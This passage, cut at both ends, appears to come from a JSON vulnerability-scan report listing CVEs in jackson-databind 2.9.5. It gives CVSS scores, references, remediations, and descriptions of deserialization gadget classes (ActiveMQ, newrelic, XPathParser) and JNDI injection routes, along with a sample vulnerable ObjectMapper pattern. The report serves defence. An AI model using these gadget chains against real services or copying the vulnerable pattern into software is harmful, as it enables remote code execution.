                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-84840",
        "references": [
          "https://access.redhat.com/errata/RHSA-2019:3140",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://access.redhat.com/errata/RHSA-2019:3892",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/051bd5e447fbc9539e12a4fe90eb989dba0c656",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://access.redhat.com/errata/RHSA-2019:2804",
          "https://lists.apache.org/thread.html/7fcf88aff0d1deaa5c3c7be8d58c05ad7ad5da94b59065d8e7c50c5d%40%3Cissues.lucene.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1822",
          "https://github.com/FasterXML/jackson-databind/commit/78e78738d69adcb59fdac9fc12d9053ce8809f3d",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/issues/2032",
          "https://access.redhat.com/errata/RHSA-2019:0782",
          "https://github.com/advisories/GHSA-qr7j-h6gg-jmgc",
          "https://access.redhat.com/errata/RHSA-2019:3002",
          "https://lists.apache.org/thread.html/7fcf88aff0d1deaa5c3c7be8d58c05ad7ad5da94b59065d8e7c50c5d@%3Cissues.lucene.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1823",
          "https://access.redhat.com/errata/RHSA-2019:4037",
          "https://github.com/FasterXML/jackson-databind/commit/27b4defc270454dea6842bd9279f17387eceb73",
          "https://nvd.nist.gov/vuln/detail/CVE-2017-7525",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2018-11307",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in multiple classes in Jackson-databind leads to data leakage.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the following classes were found to be able to cause data leakage when used as Java gadgets -\n```\norg.apache.ibatis.parsing.XPathParser\n```\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes one of the above classes in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.\n-\tThe vulnerable Java service includes one of the following classes in its Java classpath\n```\norg.apache.ibatis.parsing.XPathParser\nl```",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2018-14719",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.7 might allow remote attackers to execute arbitrary code by leveraging failure to block the blaze-ds-opt and blaze-ds-core classes from polymorphic deserialization.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.7.9.5]",
              "[2.8.11.3]",
              "[2.9.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-74875",
        "references": [
          "https://access.redhat.com/errata/RHSA-2019:1782",
          "https://www.debian.org/security/2019/dsa-4452",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44",
          "https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
          "https://access.redhat.com/errata/RHSA-2019:2804",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:0782",
          "https://access.redhat.com/errata/RHSA-2019:3140",
          "https://access.redhat.com/errata/RHSA-2019:3892",
          "https://access.redhat.com/errata/RHSA-2019:1822",
          "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.7",
          "https://www.oracle.com/technetwork/security-advisory/cpujan2019-5072801.html",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://github.com/FasterXML/jackson-databind",
          "https://access.redhat.com/errata/RHSA-2019:1797",
          "https://lists.debian.org/debian-lts-announce/2019/03/msg00005.html",
          "https://access.redhat.com/errata/RHBA-2019:0959",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/issues/2097",
          "https://seclists.org/bugtraq/2019/May/68",
          "https://security.netapp.com/advisory/ntap-20190530-0003",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:4037",
          "https://access.redhat.com/errata/RHSA-2019:1823",
          "https://access.redhat.com/errata/RHSA-2019:3002",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2018-14719",
          "https://access.redhat.com/errata/RHSA-2019:0877",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20190530-0003/",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in multiple classes in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the following classes were found to be able to cause remote code execution when used as Java gadgets -\n```\nflex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor\n```\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes one of the above classes in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.\n-\tThe vulnerable Java service includes one of the following classes in its Java classpath\n```\nflex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor\nl```",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2023-35116",
            "cvss_v3_score": "4.7",
            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-770"
            ],
            "cwe_details": {
              "CWE-770": {
                "name": "Allocation of Resources Without Limits or Throttling",
                "description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."
              }
            }
          }
        ],
        "summary": "jackson-databind through 2.15.2 allows attackers to cause a denial of service or other unspecified impact via a crafted object that uses cyclic dependencies. NOTE: the vendor's perspective is that this is not a valid vulnerability report, because the steps of constructing a cyclic data structure and trying to serialize it cannot be achieved by an external attacker.",
        "severity": "Medium",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-522015",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2023-35116",
          "https://github.com/FasterXML/jackson-databind/issues/3972"
        ],
        "extended_information": {
          "short_description": "(Non-Issue) Excessive recursion in Jackson-databind leads to denial of service when serializing untrusted Java objects.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "is_positive": true
            },
            {
              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
              "description": "The CVSS does not reflect the fact that the vulnerability was disputed.",
              "is_positive": true
            },
            {
              "name": "The issue has been disputed by the vendor",
              "description": "The vulnerable object cannot be serialized through Jackson APIs, making it extremely unlikely that such an object will be deserialized in a real-world scenario",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "A public crashing PoC was published."
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-11111",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.activemq.* (aka activemq-jms, activemq-core, activemq-pool, and activemq-pool-jms).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-96060",
        "references": [
          "https://security.netapp.com/advisory/ntap-20200403-0002/",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://security.netapp.com/advisory/ntap-20200403-0002",
          "https://github.com/FasterXML/jackson-databind/issues/2664",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://lists.debian.org/debian-lts-announce/2020/04/msg00012.html",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://github.com/FasterXML/jackson-databind",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-11111"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache ActiveMQ in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache ActiveMQ]( https://github.com/apache/activemq) gadget, an attacker can invoke `ActiveMQConnectionFactory` and `createConnection` to create a JNDI connection to an arbitrary JNDI provider, where remote code execution can be achieved via the usual [JNDI Injection](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) techniques.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ActiveMQ in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ActiveMQ in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `ActiveMQ` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36189",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138369",
        "references": [
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://github.com/FasterXML/jackson-databind/issues/2996",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://security.netapp.com/advisory/ntap-20210205-0005/",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36189",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://github.com/FasterXML/jackson-databind/commit/33d96c13fe18a2dad01b19ce195548c9acea9da4",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/advisories/GHSA-vfqx-33qm-g869"
        ],
        "extended_information": {
          "short_description": "A typing issue in newrelic.agent in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, in the `com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource` gadget in [newrelic]( https://github.com/newrelic/newrelic-java-agent), the attacker can call `lookup` with arbitrary arguments by setting the JNDI URL with `SetUrl` and then executing it with `getConnection`. This vulnerability can lead to remote code execution as described in this [PoC]( https://cloud.tencent.com/developer/article/1808059).\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` newrelic.agent` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` newrelic.agent` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `newrelic.agent` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-10969",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to javax.swing.JEditorPane.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-95784",
        "references": [
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/advisories/GHSA-758m-v56v-grj4",
          "https://github.com/FasterXML/jackson-databind/issues/2642",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-10969",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://security.netapp.com/advisory/ntap-20200403-0002",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://security.netapp.com/advisory/ntap-20200403-0002/",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://github.com/FasterXML/jackson-databind/commit/6ba48457984943df0de92c54144f7dcae01b1221",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://lists.debian.org/debian-lts-announce/2020/04/msg00012.html"
        ],
        "extended_information": {
